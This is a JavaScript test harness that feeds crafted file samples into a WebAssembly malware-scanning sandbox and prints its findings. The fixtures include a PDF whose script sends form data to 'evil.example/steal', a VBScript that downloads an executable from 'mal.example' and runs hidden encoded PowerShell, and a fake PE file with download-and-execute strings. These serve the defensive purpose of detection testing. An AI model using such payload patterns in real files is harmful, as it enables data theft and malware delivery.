import { readFileSync } from "fs";
const bytes = readFileSync("target/wasm32-unknown-unknown/release/raplsandbox.wasm");
const KINDS = {0:"TYPE",4:"EMBED",6:"KEYWORD",7:"PREVIEW",8:"NOTE"};
const INTENTS = {1:"NET",2:"EXEC",3:"SCRIPT",5:"MACRO"};

async function run(name, payload) {
  const dec = new TextDecoder();
  const findings = [], intents = [];
  let inst;
  const readMem = (ptr,len) => new Uint8Array(inst.exports.memory.buffer, ptr, len).slice();
  const { instance } = await WebAssembly.instantiate(bytes, {
    host: {
      host_emit: (kind, ptr, len, num) => {
        const s = dec.decode(readMem(ptr, len));
        if (kind === 7) return; // preview, skip in summary
        findings.push(`${KINDS[kind]||kind}: ${s}${num?` (x${num})`:""}`);
      },
      host_intent: (kind, ptr, len) => {
        intents.push(`${INTENTS[kind]||kind}: ${dec.decode(readMem(ptr,len))}`);
      },
    },
  });
  inst = instance;
  const buf = payload instanceof Uint8Array ? payload : new TextEncoder().encode(payload);
  const ptr = instance.exports.buffer();
  const cap = instance.exports.capacity();
  new Uint8Array(instance.exports.memory.buffer, ptr, buf.length).set(buf);
  const score = instance.exports.analyze(buf.length);
  console.log(`\n### ${name}  ->  score ${score}`);
  console.log("  findings:", findings.join(" | ") || "(none)");
  console.log("  INTENTS :", intents.join(" | ") || "(none)");
  console.log("  cap:", cap);
}

// Crafted malicious PDF
await run("malicious.pdf", "%PDF-1.7\n1 0 obj<</OpenAction<</S/JavaScript/JS(app.alert\('pwn'\);this.submitForm\('https://evil.example/steal'\))>>>>\n/Launch(/C calc.exe)\n/EmbeddedFile 2 0 R\nhttp://tracker.bad/beacon?id=42\nendobj");
// Fake EXE masquerading (payroll.pdf.exe content)
await run("payroll.pdf.exe", new Uint8Array([0x4D,0x5A,0x90,0x00,0x03, ...new TextEncoder().encode("This program cannot be run in DOS mode. URLDownloadToFileA powershell -enc")]));
// Benign PDF
await run("clean.pdf", "%PDF-1.4\n1 0 obj<</Type/Catalog/Pages 2 0 R>>\nHello this is a normal invoice for services rendered. Total 1200 USD.\nendobj");
// VBScript
await run("invoice.vbs", "Set obj = CreateObject(\"WScript.Shell\")\nobj.Run \"powershell -w hidden -enc ...\"\nURLDownloadToFile 0, \"http://mal.example/p.exe\"");
// Office docx with macro (zip)
await run("report.docx(zip+macro)", new Uint8Array([0x50,0x4B,0x03,0x04, ...new TextEncoder().encode("word/document.xml word/vbaProject.bin macroEnabled")]));
// Empty
await run("empty", new Uint8Array([]));
console.log("\nALL TESTS RAN");
